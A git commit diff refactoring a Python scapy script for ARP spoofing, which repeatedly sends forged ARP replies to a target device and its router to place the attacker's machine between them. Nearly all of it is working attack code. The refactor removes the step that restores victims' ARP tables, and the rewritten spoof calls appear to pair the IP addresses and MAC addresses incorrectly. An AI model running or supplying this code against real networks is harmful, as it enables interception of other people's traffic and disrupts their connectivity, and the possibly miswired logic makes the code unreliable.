d971c532759834a3206ffa212aa815dc3b1076cc
amitprizant-bit <amitprizant@gmail.com>
2026-08-21 18:38:26 +0300

    Refactor ARP spoofing logic and improve IP handling
    Refactor ARP spoofing script to improve structure and readability. Update target and gateway IP handling.

--- ArpSpoofing.py
+++ ArpSpoofing.py
@@ -1,55 +1,39 @@
 import scapy.all as scapy
 import time
 
+gateway_ip = "TARGET_ROUTER"
+target_ip = "TARGET_IP"
+
 
 def spoof(target_ip, target_mac, spoof_ip):
-    spoofed_arp_packet = scapy.ARP(
-        pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at"
-    )
-    scapy.send(spoofed_arp_packet, verbose=0)
+    spoof_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
+    scapy.send(spoof_packet, verbose=False)
 
 
 def get_mac(ip):
     arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
-    reply, something = scapy.srp(arp_request, timeout=3, verbose=0)
+    reply, _empty_ = scapy.srp(arp_request, timeout=3, verbose=False)
     if reply:
         return reply[0][1].src
-    return None
+    else:
+        return None
 
 
-def wait_till_mac_found(ip):
-    mac = None
-    while not mac:
-        mac = get_mac(ip)
-        if not mac:
-            print("MAC address for {} not found \n".format(ip))
-    return mac
-
-
-gateway_ip = "ENTER_GATEWAY_IP"
-target_ip = "ENTER_ROUTER_IP"
-
-target_mac = wait_till_mac_found(target_ip)
-gateway_mac = wait_till_mac_found(gateway_ip)
-
-
-def restore_arp(target_ip, source_ip):
-    target_mac = scapy.getmacbyip(target_ip)
-    source_mac = scapy.getmacbyip(source_ip)
-    packet = scapy.ARP(
-        op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac
-    )
-    scapy.send(packet, verbose=False)
-
-
+target_mac = None
+while not target_mac:
+    target_mac = get_mac(target_ip)
+    if not target_mac:
+        print(f"Could not find MAC address for {target_ip}. Retrying...")
+gateway_mac = None
+while not gateway_mac:
+    gateway_mac = get_mac(gateway_ip)
+    if not gateway_mac:
+        print(f"Could not find MAC address for {gateway_ip}. Retrying...")
 try:
     while True:
-        # Tell phone that I am the router
-        spoof(target_ip, target_mac, gateway_ip)
-        # Tell router that I am the phone
-        spoof(gateway_ip, gateway_mac, target_ip)
-        time.sleep(3)
+        spoof(target_ip=gateway_ip, target_mac=target_mac, spoof_ip=target_ip)
+        spoof(target_ip=target_ip, target_mac=gateway_mac, spoof_ip=gateway_ip)
+        time.sleep(1)
+        print("spoofed")
 except KeyboardInterrupt:
-    restore_arp(target_ip, gateway_ip)
-    restore_arp(gateway_ip, target_ip)
-    print("Stoped spoofing and restored ARP tables")
+    print("stopped")
